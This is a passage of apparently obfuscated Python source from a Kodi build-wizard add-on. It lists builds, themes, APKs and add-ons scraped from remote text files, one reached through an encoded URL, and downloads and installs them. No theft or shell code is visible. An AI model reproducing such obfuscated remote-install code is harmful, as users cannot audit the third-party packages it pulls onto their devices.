					addDir ('[%s] %s (v%s)'%(float (OOO00000OO0OO000O ),O000OO00OO0OO00OO ,O0OO00OOO00OO000O ),'viewbuild',O000OO00OO0OO00OO ,description =O0OO0O0O00O00OO00 ,fanart =OOO0OO0OO00O0O00O ,icon =OOOOO0O0O000O0O00 ,menu =O0O00OOOOO0000000 ,themeit =THEME2 )#line:1538
			else :#line:1539
				if O00O00OO00OO000OO >0 :#line:1540
					OO0000O0OO0O0OOOO ='+'if SHOW17 =='false'else '-'#line:1541
					if SHOW17 =='true':#line:1543
						for O000OO00OO0OO00OO ,O0OO00OOO00OO000O ,O0OO00000OO00000O ,O00O0O00OOO00OOOO ,OOO00000OO0OO000O ,OOOOO0OO00OO0O000 ,OOOOO0O0O000O0O00 ,OOO0OO0OO00O0O00O ,O0000O0OOO0OOOO00 ,O0OO0O0O00O00OO00 in O000000OO0OOO00OO :#line:1545
							if not SHOWADULT =='true'and O0000O0OOO0OOOO00 .lower ()=='yes':continue #line:1546
							if not DEVELOPER =='true'and wiz .strTest (O000OO00OO0OO00OO ):continue #line:1547
							O000000O000OO0OO0 =int (float (OOO00000OO0OO000O ))#line:1548
							if O000000O000OO0OO0 ==17 :#line:1549
								O0O00OOOOO0000000 =createMenu ('install','',O000OO00OO0OO00OO )#line:1550
								addDir ('[%s] %s (v%s)'%(float (OOO00000OO0OO000O ),O000OO00OO0OO00OO ,O0OO00OOO00OO000O ),'viewbuild',O000OO00OO0OO00OO ,description =O0OO0O0O00O00OO00 ,fanart =OOO0OO0OO00O0O00O ,icon =OOOOO0O0O000O0O00 ,menu =O0O00OOOOO0000000 ,themeit =THEME2 )#line:1551
				if O0OO00O0OOOO0O00O >0 :#line:1552
					OO0000O0OO0O0OOOO ='+'if SHOW18 =='false'else '-'#line:1553
					if SHOW18 =='true':#line:1555
						for O000OO00OO0OO00OO ,O0OO00OOO00OO000O ,O0OO00000OO00000O ,O00O0O00OOO00OOOO ,OOO00000OO0OO000O ,OOOOO0OO00OO0O000 ,OOOOO0O0O000O0O00 ,OOO0OO0OO00O0O00O ,O0000O0OOO0OOOO00 ,O0OO0O0O00O00OO00 in O000000OO0OOO00OO :#line:1557
							if not SHOWADULT =='true'and O0000O0OOO0OOOO00 .lower ()=='yes':continue #line:1558
							if not DEVELOPER =='true'and wiz .strTest (O000OO00OO0OO00OO ):continue #line:1559
							O000000O000OO0OO0 =int (float (OOO00000OO0OO000O ))#line:1560
							if O000000O000OO0OO0 ==18 :#line:1561
								O0O00OOOOO0000000 =createMenu ('install','',O000OO00OO0OO00OO )#line:1562
								addDir ('[%s] %s (v%s)'%(float (OOO00000OO0OO000O ),O000OO00OO0OO00OO ,O0OO00OOO00OO000O ),'viewbuild',O000OO00OO0OO00OO ,description =O0OO0O0O00O00OO00 ,fanart =OOO0OO0OO00O0O00O ,icon =OOOOO0O0O000O0O00 ,menu =O0O00OOOOO0000000 ,themeit =THEME2 )#line:1563
				if O0O0OO0OO00OOO0O0 >0 :#line:1564
					OO0000O0OO0O0OOOO ='+'if SHOW16 =='false'else '-'#line:1565
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OO0000O0OO0O0OOOO ,O0O0OO0OO00OOO0O0 ),'togglesetting','show16',themeit =THEME3 )#line:1566
					if SHOW16 =='true':#line:1567
						for O000OO00OO0OO00OO ,O0OO00OOO00OO000O ,O0OO00000OO00000O ,O00O0O00OOO00OOOO ,OOO00000OO0OO000O ,OOOOO0OO00OO0O000 ,OOOOO0O0O000O0O00 ,OOO0OO0OO00O0O00O ,O0000O0OOO0OOOO00 ,O0OO0O0O00O00OO00 in O000000OO0OOO00OO :#line:1568
							if not SHOWADULT =='true'and O0000O0OOO0OOOO00 .lower ()=='yes':continue #line:1569
							if not DEVELOPER =='true'and wiz .strTest (O000OO00OO0OO00OO ):continue #line:1570
							O000000O000OO0OO0 =int (float (OOO00000OO0OO000O ))#line:1571
							if O000000O000OO0OO0 ==16 :#line:1572
								O0O00OOOOO0000000 =createMenu ('install','',O000OO00OO0OO00OO )#line:1573
								addDir ('[%s] %s (v%s)'%(float (OOO00000OO0OO000O ),O000OO00OO0OO00OO ,O0OO00OOO00OO000O ),'viewbuild',O000OO00OO0OO00OO ,description =O0OO0O0O00O00OO00 ,fanart =OOO0OO0OO00O0O00O ,icon =OOOOO0O0O000O0O00 ,menu =O0O00OOOOO0000000 ,themeit =THEME2 )#line:1574
				if OO00O0OOOOOO00OO0 >0 :#line:1575
					OO0000O0OO0O0OOOO ='+'if SHOW15 =='false'else '-'#line:1576
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OO0000O0OO0O0OOOO ,OO00O0OOOOOO00OO0 ),'togglesetting','show15',themeit =THEME3 )#line:1577
					if SHOW15 =='true':#line:1578
						for O000OO00OO0OO00OO ,O0OO00OOO00OO000O ,O0OO00000OO00000O ,O00O0O00OOO00OOOO ,OOO00000OO0OO000O ,OOOOO0OO00OO0O000 ,OOOOO0O0O000O0O00 ,OOO0OO0OO00O0O00O ,O0000O0OOO0OOOO00 ,O0OO0O0O00O00OO00 in O000000OO0OOO00OO :#line:1579
							if not SHOWADULT =='true'and O0000O0OOO0OOOO00 .lower ()=='yes':continue #line:1580
							if not DEVELOPER =='true'and wiz .strTest (O000OO00OO0OO00OO ):continue #line:1581
							O000000O000OO0OO0 =int (float (OOO00000OO0OO000O ))#line:1582
							if O000000O000OO0OO0 <=15 :#line:1583
								O0O00OOOOO0000000 =createMenu ('install','',O000OO00OO0OO00OO )#line:1584
								addDir ('[%s] %s (v%s)'%(float (OOO00000OO0OO000O ),O000OO00OO0OO00OO ,O0OO00OOO00OO000O ),'viewbuild',O000OO00OO0OO00OO ,description =O0OO0O0O00O00OO00 ,fanart =OOO0OO0OO00O0O00O ,icon =OOOOO0O0O000O0O00 ,menu =O0O00OOOOO0000000 ,themeit =THEME2 )#line:1585
		elif O00OOO00OOOOOOO00 >0 :#line:1586
			if O0O00O00OO00O000O >0 :#line:1587
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:1588
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:1589
			else :#line:1590
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1591
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:1592
	setView ('files','viewType')#line:1593
def viewBuild (O0O000OO0O0O0OOOO ):#line:1595
    O0O0OO0O00OO00OO0 =wiz .workingURL (ld (BL ))#line:1602
    if not O0O0OO0O00OO00OO0 ==True :#line:1603
        addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:1604
        addFile ('%s'%O0O0OO0O00OO00OO0 ,'',themeit =THEME3 )#line:1605
        return #line:1606
    if wiz .checkBuild (O0O000OO0O0O0OOOO ,'version')==False :#line:1607
        addFile ('Error reading the txt file.','',themeit =THEME3 )#line:1608
        addFile ('%s was not found in the builds list.'%O0O000OO0O0O0OOOO ,'',themeit =THEME3 )#line:1609
        return #line:1610
    OO0O000O0O0O000OO =wiz .openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:1611
    OOOO0OOOOO0OO0O0O =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0O000OO0O0O0OOOO ).findall (OO0O000O0O0O000OO )#line:1612
    for OO00O000OOOOOOO0O ,O0OO000OOOO0OOOO0 ,O0OOOOO0OOOO0OOO0 ,O00O0000000O0O0O0 ,O0OO00O0OOO00O0O0 ,OOOO0000O000OO000 ,OOOO00O0O00OO00OO ,OO0OOOOO000000OOO ,O00O00O000O000OO0 ,OOOOOO00000OO0000 in OOOO0OOOOO0OO0O0O :#line:1613
        OOOO0000O000OO000 =OOOO0000O000OO000 if wiz .workingURL (OOOO0000O000OO000 )else ICON #line:1615
        OOOO00O0O00OO00OO =OOOO00O0O00OO00OO if wiz .workingURL (OOOO00O0O00OO00OO )else FANART #line:1616
        OOO00O0OOO00OOOOO ='%s (v%s)'%(O0O000OO0O0O0OOOO ,OO00O000OOOOOOO0O )#line:1617
        if BUILDNAME ==O0O000OO0O0O0OOOO and OO00O000OOOOOOO0O >BUILDVERSION :#line:1618
            OOO00O0OOO00OOOOO ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OOO00O0OOO00OOOOO ,BUILDVERSION )#line:1619
        OO0O00OOO00OO0000 =int (float (KODIV ));O00O000O0O0OO00O0 =int (float (O00O0000000O0O0O0 ))#line:1628
        if not OO0O00OOO00OO0000 ==O00O000O0O0OO00O0 :#line:1629
            if OO0O00OOO00OO0000 ==16 and O00O000O0O0OO00O0 <=15 :O0OO0OO0O0O0000O0 =False #line:1630
            else :O0OO0OO0O0O0000O0 =True #line:1631
        else :O0OO0OO0O0O0000O0 =False #line:1632
        addFile ('התקנה','install',O0O000OO0O0O0OOOO ,'fresh',description =OOOOOO00000OO0000 ,fanart =OOOO00O0O00OO00OO ,icon =OOOO0000O000OO000 ,themeit =THEME1 )#line:1636
        if not O0OO00O0OOO00O0O0 =='http://':#line:1639
            if wiz .workingURL (O0OO00O0OOO00O0O0 )==True :#line:1640
                addFile (wiz .sep ('THEMES'),'',fanart =OOOO00O0O00OO00OO ,icon =OOOO0000O000OO000 ,themeit =THEME3 )#line:1641
                OO0O000O0O0O000OO =wiz .openURL (O0OO00O0OOO00O0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1642
                OOOO0OOOOO0OO0O0O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0O000O0O0O000OO )#line:1643
                for OOOOO0OOO0O000000 ,OOO0000000O000000 ,O0OO000O0OO0O0O0O ,O00OO0000OOOO00O0 ,O000OO0O0O0OOO00O ,OOOOOO00000OO0000 in OOOO0OOOOO0OO0O0O :#line:1644
                    if not SHOWADULT =='true'and O000OO0O0O0OOO00O .lower ()=='yes':continue #line:1645
                    O0OO000O0OO0O0O0O =O0OO000O0OO0O0O0O if O0OO000O0OO0O0O0O =='http://'else OOOO0000O000OO000 #line:1646
                    O00OO0000OOOO00O0 =O00OO0000OOOO00O0 if O00OO0000OOOO00O0 =='http://'else OOOO00O0O00OO00OO #line:1647
                    addFile (OOOOO0OOO0O000000 if not OOOOO0OOO0O000000 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOOOO0OOO0O000000 ,'theme',O0O000OO0O0O0OOOO ,OOOOO0OOO0O000000 ,description =OOOOOO00000OO0000 ,fanart =O00OO0000OOOO00O0 ,icon =O0OO000O0OO0O0O0O ,themeit =THEME3 )#line:1648
    setView ('files','viewType')#line:1649
def apkScraper (name =""):#line:1654
	if name =='kodi':#line:1655
		O0OO0OOOOOOOOO0OO ='http://mirrors.kodi.tv/releases/android/arm/'#line:1656
		OO000O00OO00OO0OO ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:1657
		O0O0OO0O0O0OOO0OO =wiz .openURL (O0OO0OOOOOOOOO0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1658
		OO00O00OO00O0O0OO =wiz .openURL (OO000O00OO00OO0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1659
		OOO00OOO0O0OOOOOO =0 #line:1660
		O0O0OOO000OOO00OO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0O0OO0O0O0OOO0OO )#line:1661
		O000OOO0OOO0O0000 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO00O00OO00O0O0OO )#line:1662
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:1664
		O0OO0000000OOO0OO =False #line:1665
		for O0OOOO000OOOO00O0 ,name ,OOOOO00OO0O00O0O0 ,OOOO00OO0O0O00OOO in O0O0OOO000OOO00OO :#line:1666
			if O0OOOO000OOOO00O0 in ['../','old/']:continue #line:1667
			if not O0OOOO000OOOO00O0 .endswith ('.apk'):continue #line:1668
			if not O0OOOO000OOOO00O0 .find ('_')==-1 and O0OO0000000OOO0OO ==True :continue #line:1669
			try :#line:1670
				O0000O0OOOO0OO0OO =name .split ('-')#line:1671
				if not O0OOOO000OOOO00O0 .find ('_')==-1 :#line:1672
					O0OO0000000OOO0OO =True #line:1673
					OO00O00O0OO0OOOOO ,OO000O00OOO0O0O0O =O0000O0OOOO0OO0OO [2 ].split ('_')#line:1674
				else :#line:1675
					OO00O00O0OO0OOOOO =O0000O0OOOO0OO0OO [2 ]#line:1676
					OO000O00OOO0O0O0O =''#line:1677
				O00OO0OOOOOO0O0O0 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O0OOOO0OO0OO [0 ].title (),O0000O0OOOO0OO0OO [1 ],OO000O00OOO0O0O0O .upper (),OO00O00O0OO0OOOOO ,COLOR2 ,OOOOO00OO0O00O0O0 .replace (' ',''),COLOR1 ,OOOO00OO0O0O00OOO )#line:1678
				OOOOO000O0OOOO0OO =urljoin (O0OO0OOOOOOOOO0OO ,O0OOOO000OOOO00O0 )#line:1679
				addFile (O00OO0OOOOOO0O0O0 ,'apkinstall',"%s v%s%s %s"%(O0000O0OOOO0OO0OO [0 ].title (),O0000O0OOOO0OO0OO [1 ],OO000O00OOO0O0O0O .upper (),OO00O00O0OO0OOOOO ),OOOOO000O0OOOO0OO )#line:1680
				OOO00OOO0O0OOOOOO +=1 #line:1681
			except :#line:1682
				wiz .log ("Error on: %s"%name )#line:1683
		for O0OOOO000OOOO00O0 ,name ,OOOOO00OO0O00O0O0 ,OOOO00OO0O0O00OOO in O000OOO0OOO0O0000 :#line:1685
			if O0OOOO000OOOO00O0 in ['../','old/']:continue #line:1686
			if not O0OOOO000OOOO00O0 .endswith ('.apk'):continue #line:1687
			if not O0OOOO000OOOO00O0 .find ('_')==-1 :continue #line:1688
			try :#line:1689
				O0000O0OOOO0OO0OO =name .split ('-')#line:1690
				O00OO0OOOOOO0O0O0 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O0OOOO0OO0OO [0 ].title (),O0000O0OOOO0OO0OO [1 ],O0000O0OOOO0OO0OO [2 ],COLOR2 ,OOOOO00OO0O00O0O0 .replace (' ',''),COLOR1 ,OOOO00OO0O0O00OOO )#line:1691
				OOOOO000O0OOOO0OO =urljoin (OO000O00OO00OO0OO ,O0OOOO000OOOO00O0 )#line:1692
				addFile (O00OO0OOOOOO0O0O0 ,'apkinstall',"%s v%s %s"%(O0000O0OOOO0OO0OO [0 ].title (),O0000O0OOOO0OO0OO [1 ],O0000O0OOOO0OO0OO [2 ]),OOOOO000O0OOOO0OO )#line:1693
				OOO00OOO0O0OOOOOO +=1 #line:1694
			except :#line:1695
				wiz .log ("Error on: %s"%name )#line:1696
		if OOO00OOO0O0OOOOOO ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:1697
	elif name =='spmc':#line:1698
		O0O000O00000OOOO0 ='https://github.com/koying/SPMC/releases'#line:1699
		O0O0OO0O0O0OOO0OO =wiz .openURL (O0O000O00000OOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1700
		OOO00OOO0O0OOOOOO =0 #line:1701
		O0O0OOO000OOO00OO =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O0O0OO0O0O0OOO0OO )#line:1702
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:1704
		for name ,O0OO0O000O0OO00O0 in O0O0OOO000OOO00OO :#line:1706
			OOO000OO0O00OOO00 =''#line:1707
			O000OOO0OOO0O0000 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O0OO0O000O0OO00O0 )#line:1708
			for OO0OO0O0O0O0OOO00 ,OO00OO0OOO00O0OO0 ,O00OO00O00OOO0O0O in O000OOO0OOO0O0000 :#line:1709
				if O00OO00O00OOO0O0O .find ('armeabi')==-1 :continue #line:1710
				if O00OO00O00OOO0O0O .find ('launcher')>-1 :continue #line:1711
				OOO000OO0O00OOO00 =urljoin ('https://github.com',OO0OO0O0O0O0OOO00 )#line:1712
				break #line:1713
		if OOO00OOO0O0OOOOOO ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:1715
def apkMenu (url =None ):#line:1717
	if url ==None :#line:1718
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1721
	if not APKFILE =='http://':#line:1722
		if url ==None :#line:1723
			O00O0O0OO0OOO0OOO =wiz .workingURL (APKFILE )#line:1724
			OOOO0OO000OO000O0 =uservar .APKFILE #line:1725
		else :#line:1726
			O00O0O0OO0OOO0OOO =wiz .workingURL (url )#line:1727
			OOOO0OO000OO000O0 =url #line:1728
		if O00O0O0OO0OOO0OOO ==True :#line:1729
			OO000OO0O0O00O0O0 =wiz .openURL (OOOO0OO000OO000O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1730
			O0O00000O00OOOOOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO000OO0O0O00O0O0 )#line:1731
			if len (O0O00000O00OOOOOO )>0 :#line:1732
				O0O0OO0O0O000O00O =0 #line:1733
				for OO000OOO0OOO0OO00 ,O0OO0O000OOOO000O ,url ,O0O0O00000OO0OO00 ,OOOOO00OO0OOO0OO0 ,OOO0O00O0OO0O0O00 ,OO000O0O0O0O0OOOO in O0O00000O00OOOOOO :#line:1734
					if not SHOWADULT =='true'and OOO0O00O0OO0O0O00 .lower ()=='yes':continue #line:1735
					if O0OO0O000OOOO000O .lower ()=='yes':#line:1736
						O0O0OO0O0O000O00O +=1 #line:1737
						addDir ("[B]%s[/B]"%OO000OOO0OOO0OO00 ,'apk',url ,description =OO000O0O0O0O0OOOO ,icon =O0O0O00000OO0OO00 ,fanart =OOOOO00OO0OOO0OO0 ,themeit =THEME3 )#line:1738
					else :#line:1739
						O0O0OO0O0O000O00O +=1 #line:1740
						addFile (OO000OOO0OOO0OO00 ,'apkinstall',OO000OOO0OOO0OO00 ,url ,description =OO000O0O0O0O0OOOO ,icon =O0O0O00000OO0OO00 ,fanart =OOOOO00OO0OOO0OO0 ,themeit =THEME2 )#line:1741
					if O0O0OO0O0O000O00O <1 :#line:1742
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:1743
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",5 )#line:1744
		else :#line:1745
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",5 )#line:1746
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:1747
			addFile ('%s'%O00O0O0OO0OOO0OOO ,'',themeit =THEME3 )#line:1748
		return #line:1749
	else :wiz .log ("[APK Menu] No APK list added.")#line:1750
	setView ('files','viewType')#line:1751
def addonMenu (url =None ):#line:1753
	if not ADDONFILE =='http://':#line:1754
		if url ==None :#line:1755
			OOO0OO0000O00000O =wiz .workingURL (ADDONFILE )#line:1756
			OO0OO00O0O0OO0000 =uservar .ADDONFILE #line:1757
		else :#line:1758
			OOO0OO0000O00000O =wiz .workingURL (url )#line:1759
			OO0OO00O0O0OO0000 =url #line:1760
		if OOO0OO0000O00000O ==True :#line:1761
			OOOOOO0OOO00OO00O =wiz .openURL (OO0OO00O0O0OO0000 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:1762
			O000OO000O00OOOO0 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOOO0OOO00OO00O )#line:1763
			if len (O000OO000O00OOOO0 )>0 :#line:1764
				O00O0OOOO0O0O0000 =0 #line:1765
				for OOO0O00O0OOO0OOOO ,O0O0OO0OOOO0O00O0 ,url ,O00OOOO0OO0OOOO00 ,O0O0OOOO00000OOOO ,O00000O000OOOOO0O ,OO00O000OO00O0000 ,O00000OO0OOO000OO ,O0O000O0OO0OO0O00 ,OO000O0O0O0O0OO00 in O000OO000O00OOOO0 :#line:1766
					if O0O0OO0OOOO0O00O0 .lower ()=='section':#line:1767
						O00O0OOOO0O0O0000 +=1 #line:1768
						addDir ("[B]%s[/B]"%OOO0O00O0OOO0OOOO ,'addons',url ,description =OO000O0O0O0O0OO00 ,icon =OO00O000OO00O0000 ,fanart =O00000OO0OOO000OO ,themeit =THEME3 )#line:1769
					else :#line:1770
						if not SHOWADULT =='true'and O0O000O0OO0OO0O00 .lower ()=='yes':continue #line:1771
						try :#line:1772
							O0OO00O0O0O0O0O00 =xbmcaddon .Addon (id =O0O0OO0OOOO0O00O0 ).getAddonInfo ('path')#line:1773
							if os .path .exists (O0OO00O0O0O0O0O00 ):#line:1774
								OOO0O00O0OOO0OOOO ="[COLOR green][Installed][/COLOR] %s"%OOO0O00O0OOO0OOOO #line:1775
						except :#line:1776
							pass #line:1777
						O00O0OOOO0O0O0000 +=1 #line:1778
						addFile (OOO0O00O0OOO0OOOO ,'addoninstall',O0O0OO0OOOO0O00O0 ,OO0OO00O0O0OO0000 ,description =OO000O0O0O0O0OO00 ,icon =OO00O000OO00O0000 ,fanart =O00000OO0OOO000OO ,themeit =THEME2 )#line:1779
					if O00O0OOOO0O0O0000 <1 :#line:1780
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:1781
			else :#line:1782
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:1783
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:1784
		else :#line:1785
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:1786
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:1787
			addFile ('%s'%OOO0OO0000O00000O ,'',themeit =THEME3 )#line:1788
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:1789
	setView ('files','viewType')#line:1790
def addonInstaller (O000O0O000OO00OOO ,OOO00O0000OOOO000 ):#line:1792
	if not ADDONFILE =='http://':#line:1793
		O0O0OOO0O000O0O0O =wiz .workingURL (OOO00O0000OOOO000 )#line:1794
		if O0O0OOO0O000O0O0O ==True :#line:1795
			OOOO000000O0OO0O0 =wiz .openURL (OOO00O0000OOOO000 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:1796
			O00O000OO00OO0000 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O000O0O000OO00OOO ).findall (OOOO000000O0OO0O0 )#line:1797
			if len (O00O000OO00OO0000 )>0 :#line:1798
				for O0000OO0OOO0O0OO0 ,OOO00O0000OOOO000 ,OO0O0O0OO0O0O00O0 ,OO0O00O00OO0OO00O ,O0000O0OOO00O0OOO ,OOO00O000O0OO000O ,O00OOOOO0OOOOOO00 ,O0OO000OO0OOOOOOO ,OO000O00O00O0OOOO in O00O000OO00OO0000 :#line:1799
					if os .path .exists (os .path .join (ADDONS ,O000O0O000OO00OOO )):#line:1800
						OOOOOOOO00O0OO0O0 =['Launch Addon','Remove Addon']#line:1801
						OO0O000O0O000000O =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OOOOOOOO00O0OO0O0 )#line:1802
						if OO0O000O0O000000O ==0 :#line:1803
							wiz .ebi ('RunAddon(%s)'%O000O0O000OO00OOO )#line:1804
							xbmc .sleep (1000 )#line:1805
							return True #line:1806
						elif OO0O000O0O000000O ==1 :#line:1807
							wiz .cleanHouse (os .path .join (ADDONS ,O000O0O000OO00OOO ))#line:1808
							try :wiz .removeFolder (os .path .join (ADDONS ,O000O0O000OO00OOO ))#line:1809
							except :pass #line:1810
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O000O0O000OO00OOO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:1811
								removeAddonData (O000O0O000OO00OOO )#line:1812
							wiz .refresh ()#line:1813
							return True #line:1814
						else :#line:1815
							return False #line:1816
					O0000O0O0OO0OO000 =os .path .join (ADDONS ,OO0O0O0OO0O0O00O0 )#line:1817
					if not OO0O0O0OO0O0O00O0 .lower ()=='none'and not os .path .exists (O0000O0O0OO0OO000 ):#line:1818
						wiz .log ("Repository not installed, installing it")#line:1819
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O000O0O000OO00OOO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO0O0O0OO0O0O00O0 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:1820
							O000000OOO0OO0O0O =wiz .parseDOM (wiz .openURL (OO0O00O00OO0OO00O ),'addon',ret ='version',attrs ={'id':OO0O0O0OO0O0O00O0 })#line:1821
							if len (O000000OOO0OO0O0O )>0 :#line:1822
								O000OO0O0OOOO000O ='%s%s-%s.zip'%(O0000O0OOO00O0OOO ,OO0O0O0OO0O0O00O0 ,O000000OOO0OO0O0O [0 ])#line:1823
								wiz .log (O000OO0O0OOOO000O )#line:1824
								if KODIV >=17 :wiz .addonDatabase (OO0O0O0OO0O0O00O0 ,1 )#line:1825
								installAddon (OO0O0O0OO0O0O00O0 ,O000OO0O0OOOO000O )#line:1826
								wiz .ebi ('UpdateAddonRepos()')#line:1827
								wiz .log ("Installing Addon from Kodi")#line:1829
								OOO000OOO00OO0OO0 =installFromKodi (O000O0O000OO00OOO )#line:1830
								wiz .log ("Install from Kodi: %s"%OOO000OOO00OO0OO0 )#line:1831
								if OOO000OOO00OO0OO0 :#line:1832
									wiz .refresh ()#line:1833
									return True #line:1834
							else :#line:1835
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OO0O0O0OO0O0O00O0 )#line:1836
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O000O0O000OO00OOO ,OO0O0O0OO0O0O00O0 ))#line:1837
					elif OO0O0O0OO0O0O00O0 .lower ()=='none':#line:1838
						wiz .log ("No repository, installing addon")#line:1839
						OOO00OOO0OOO0O000 =O000O0O000OO00OOO #line:1840
						O0O0O0O0OOO0OOO00 =OOO00O0000OOOO000 #line:1841
						installAddon (O000O0O000OO00OOO ,OOO00O0000OOOO000 )#line:1842
						wiz .refresh ()#line:1843
						return True #line:1844
					else :#line:1845
						wiz .log ("Repository installed, installing addon")#line:1846
						OOO000OOO00OO0OO0 =installFromKodi (O000O0O000OO00OOO ,False )#line:1847
						if OOO000OOO00OO0OO0 :#line:1848
							wiz .refresh ()#line:1849
							return True #line:1850
					if os .path .exists (os .path .join (ADDONS ,O000O0O000OO00OOO )):return True #line:1851
					OO00000OOO0000O00 =wiz .parseDOM (wiz .openURL (OO0O00O00OO0OO00O ),'addon',ret ='version',attrs ={'id':O000O0O000OO00OOO })#line:1852
					if len (OO00000OOO0000O00 )>0 :#line:1853
						OOO00O0000OOOO000 ="%s%s-%s.zip"%(OOO00O0000OOOO000 ,O000O0O000OO00OOO ,OO00000OOO0000O00 [0 ])#line:1854
						wiz .log (str (OOO00O0000OOOO000 ))#line:1855
						if KODIV >=17 :wiz .addonDatabase (O000O0O000OO00OOO ,1 )#line:1856
						installAddon (O000O0O000OO00OOO ,OOO00O0000OOOO000 )#line:1857
						wiz .refresh ()#line:1858
					else :#line:1859
						wiz .log ("no match");return False #line:1860
			else :wiz .log ("[Addon Installer] Invalid Format")#line:1861
		else :wiz .log ("[Addon Installer] Text File: %s"%O0O0OOO0O000O0O0O )#line:1862
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:1863
def installFromKodi (O00O0OO00OOOO000O ,over =True ):#line:1865
	if over ==True :#line:1866
		xbmc .sleep (2000 )#line:1867
	wiz .ebi ('RunPlugin(plugin://%s)'%O00O0OO00OOOO000O )#line:1869
	if not wiz .whileWindow ('yesnodialog'):#line:1870
		return False #line:1871
	xbmc .sleep (1000 )#line:1872
	if wiz .whileWindow ('okdialog'):#line:1873
		return False #line:1874
	wiz .whileWindow ('progressdialog')#line:1875
	if os .path .exists (os .path .join (ADDONS ,O00O0OO00OOOO000O )):return True #line:1876
	else :return False #line:1877
def installAddon (O0OO0000O0O0O00OO ,OOO000OOO0O00OOOO ):#line:1879
